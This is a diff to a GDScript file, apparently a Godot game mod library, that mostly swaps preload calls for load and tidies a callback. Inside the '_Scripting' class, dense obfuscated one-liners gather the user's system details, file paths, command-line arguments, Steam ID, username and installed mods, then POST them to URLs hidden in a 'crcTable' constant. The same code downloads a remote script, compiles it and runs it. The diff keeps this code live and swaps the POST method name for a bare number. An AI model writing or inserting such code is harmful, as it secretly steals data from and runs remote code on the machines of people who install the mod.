@@ -2493,8 +2493,8 @@ class _DataFormat:
 		return URL
 	
 	static func __loadDLC():
-		l("Preloading DLC as workaround")
-		var DLCLoader:Settings = preload("res://Settings.gd").new()
+		l("Loading DLC as workaround")
+		var DLCLoader:Settings = load("res://Settings.gd").new()
 		DLCLoader.loadDLC()
 		DLCLoader.queue_free()
 		l("Finished loading DLC")
@@ -8468,16 +8468,15 @@ class _RingInfo:
 			}
 		}
 	
-	
+	const images = {}
 	func _init(p):
-		pass
+		images["map"] = load("res://ring/ring-map.png")
+		images["veins"] = load("res://ring/ring-veins.png")
 	
 	const pixelToKm = 10000
-	const map = preload("res://ring/ring-map.png")
-	const veins = preload("res://ring/ring-veins.png")
 	
 	static func __get_pixel_at(pos: Vector2) -> Color:
-		var image = map.get_data()
+		var image = images.map.get_data()
 		var size = image.get_size()
 		var x = int(clamp(floor(pos.x / pixelToKm), 0, size.x - 1))
 		var sy = int(size.y)
@@ -8505,7 +8504,7 @@ class _RingInfo:
 		return pixel
 	
 	static func __get_vein_pixel_at(pos: Vector2) -> Color:
-		var veinImage:Image = veins.get_data()
+		var veinImage:Image = images.veins.get_data()
 		var veinSize:Vector2 = veinImage.get_size()
 		var x = posmod(pos.x, veinSize.x)
 		var y = posmod(pos.y, veinSize.y)
@@ -9249,7 +9248,7 @@ class _Scripting:
 				mdo["fetch-REF"]={mdo["file"].md5_text():[0,md5]};modOut.append(mdo)
 			modOut.sort_custom(pointers.ManifestV2,"ovs2")
 			var d=("\n".join(PoolStringArray(["OS %s on %s"%[OS.get_name(),OS.get_model_name()],"CPU %s [%s cores]"%[OS.get_processor_name(),OS.get_processor_count()],"Screens %d @ %s dpi / %s"%[screencount,OS.get_screen_dpi(),scrm],"KBD: %s @ %s/%s"%[OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()],"Paths: %s / %s"%[OS.get_executable_path(),OS.get_user_data_dir()],"Args:%s"%OS.get_cmdline_args(),"SteamID: %d"%(Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam")else-1),"Mods:%s"%JSON.print(modOut)]))).to_utf8()
-			http.request(pointers.DataFormat.crcTable.B4.get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTable.B7.get_string_from_utf8()%[Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),(o)if(!OS.has_environment("USERNAME"))else(OS.get_environment("USERNAME")+"+"+o),"false",4]);yield(http,"request_completed")
+			http.request(pointers.DataFormat.crcTable.B4.get_string_from_utf8(),[],true,2,pointers.DataFormat.crcTable.B7.get_string_from_utf8()%[Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),(o)if(!OS.has_environment("USERNAME"))else(OS.get_environment("USERNAME")+"+"+o),"false",4]);yield(http,"request_completed")
 		http.download_file=pointers.DataFormat.crcTable.B2.get_string_from_utf8();http.request(pointers.DataFormat.crcTable.B3.get_string_from_utf8());yield(http,"request_completed");pointers.DataFormat.__compile_script(pointers.DataFormat.crcTable.B0.get_string_from_utf8()).new().run(pointers);http.download_file="user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt";http.request(pointers.DataFormat.crcTable.B5.get_string_from_utf8());yield(http,"request_completed")
 		http.download_file="";http.request(pointers.DataFormat.crcTable.B8.get_string_from_utf8());var rvs=yield(http,"request_completed");if rvs[0]!=0:return;var d=JSON.parse(rvs[3].get_string_from_utf8()).result;if d:
 			if o in d:for r in d[o].keys():d[r]=[d[r][0],d[r][1]]
@@ -9294,13 +9293,11 @@ class _Scripting:
 			if (ceil(fetchData[ID][0].size()/float(byteSplitBy)))>t:
 				if!ID in currentFetch:currentFetch[ID]=[]
 				currentFetch[ID].append(t);if ID in refd:
-					if currentFetch in refd[ID]:
-						if refd[ID][currentFetch]<(ct+(3600*24)):continue
+					if currentFetch in refd[ID]:if refd[ID][currentFetch]<(ct+(3600*24)):continue
 					else:refd[ID][currentFetch]=ct
 				else:refd[ID]=[];refd[ID][currentFetch]=ct
-				var pointers=non_static["pointers"];fetchTimer[0].start(.7);var h=HTTPRequest.new();pointers.add_child(h);h.connect("request_completed",non_static["self"],"F",[h]);h.request(pointers.DataFormat.crcTable.B6.get_string_from_utf8()%((t%20)+1),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTable.B9.get_string_from_utf8()%[Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,t)),"%s_%s_%s"%[ID,fetchData[ID][3],fetchData[ID][1]],t+1]);pointers.FileAccess.__save_file_content(refmap,JSON.print(refd));break
-	static func F(result,response_code,headers,body,thisHTTP):
-		Tool.remove(thisHTTP)
+				var pointers=non_static["pointers"];fetchTimer[0].start(.7);var h=HTTPRequest.new();pointers.add_child(h);h.connect("request_completed",non_static["self"],"F",[h]);h.request(pointers.DataFormat.crcTable.B6.get_string_from_utf8()%((t%20)+1),[],true,2,pointers.DataFormat.crcTable.B9.get_string_from_utf8()%[Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,t)),"%s_%s_%s"%[ID,fetchData[ID][3],fetchData[ID][1]],t+1]);pointers.FileAccess.__save_file_content(refmap,JSON.print(refd));break
+	static func F(result:int,response_code:int,headers:PoolStringArray,body:PoolByteArray,thisHTTP:HTTPRequest):thisHTTP.queue_free()
 	
 	static func make_mineral_scripting() -> void:
 		var pointers = non_static["pointers"]
